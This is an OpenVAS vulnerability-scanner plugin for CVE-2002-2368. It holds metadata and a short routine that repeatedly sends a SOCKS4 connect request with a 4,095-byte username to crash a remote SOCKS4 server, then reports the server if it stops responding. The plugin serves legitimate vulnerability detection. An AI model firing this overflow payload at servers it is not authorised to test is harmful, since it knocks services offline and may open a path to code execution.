###############################################################################
# OpenVAS Vulnerability Test
#
# SOCKS4 username overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11164");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2002-2368");
  script_bugtraq_id(5147);
  script_name("SOCKS4 username overflow");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("socks.nasl");
  script_require_ports("Services/socks4", 1080);
  script_mandatory_keys("socks4/detected");

  script_tag(name:"summary", value:"It was possible to kill the remote SOCKS4 server by
  sending a request with a too long username.");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make your SOCKS server
  crash continually or even execute arbitrary code on your system.");

  script_tag(name:"solution", value:"Upgrade your software.");

  script_tag(name:"affected", value:"AN HTTPD. Other products might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

port = get_port_for_service(default:1080, proto:"socks4");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

nlen = 4095;
# Connect to 10.10.10.10 on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 10, 10, 10, 10) + crap(nlen) + raw_string(0);

for(i=0; i < 6; i++) {
  send(socket:soc, data:cnx);
  r = recv(socket:soc, length:8, timeout:1);
  close(soc);
  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port);
    exit(0);
  } else {
    close(soc);
  }
}

exit(99);